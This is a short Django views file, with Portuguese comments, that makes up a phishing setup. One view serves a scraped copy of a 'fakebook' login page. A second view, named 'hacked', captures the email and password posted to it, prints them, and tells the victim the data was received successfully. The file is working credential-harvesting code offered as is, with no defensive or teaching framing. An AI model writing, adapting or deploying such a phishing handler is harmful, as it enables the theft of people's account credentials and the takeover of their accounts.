from django.shortcuts import render
from django.http import HttpResponse
from bs4 import BeautifulSoup

def fakebookLogin(request):
    with open('scrapper/fakebookScrapper/novo_html.html', 'r') as f:
        soup = BeautifulSoup(f, 'html.parser')

    new_html = soup.prettify()

    # Renderize o novo HTML como resposta HTTP
    response = HttpResponse(new_html, content_type='text/html')

    return response

def hacked(request):
    if request.method == "POST":
        email = request.POST.get("email")
        password = request.POST.get("pass")
        print("Email:", email)
        print("Password:", password)
        return HttpResponse("Dados recebidos com sucesso!")
    else:
        return HttpResponse("Método não permitido!")

